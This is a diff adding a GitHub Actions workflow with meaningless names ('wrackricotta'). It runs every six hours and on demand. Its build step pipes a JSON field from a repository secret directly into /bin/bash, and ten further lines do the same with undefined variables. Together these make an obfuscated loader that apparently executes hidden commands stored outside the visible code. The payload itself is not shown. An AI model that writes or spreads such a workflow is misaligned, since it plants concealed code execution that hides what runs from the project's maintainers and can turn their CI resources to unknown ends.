@@ -1,0 +1,27 @@
+name: wrackricotta
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '20 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wrackricotta
+        env:
+          qkcd44535: ${{ secrets.qkcd44535 }}
+        run: |
+          echo $qkcd44535 | jq -r .zed454 | /bin/bash
+          echo $oavxi10 | jq -r .ljg8121 | /bin/bash
+          echo $n1623 | jq -r .t7217 | /bin/bash
+          echo $umeo9 | jq -r .mepns7 | /bin/bash
+          echo $ts6 | jq -r .yjirv53969 | /bin/bash
+          echo $kabwf4428 | jq -r .xeeqg03 | /bin/bash
+          echo $fwub8 | jq -r .b0212 | /bin/bash
+          echo $pyx7 | jq -r .zp6681 | /bin/bash
+          echo $t9 | jq -r .athr57116 | /bin/bash
+          echo $u9509 | jq -r .ugz85 | /bin/bash
+          echo $bt6211 | jq -r .uccu6119 | /bin/bash
+
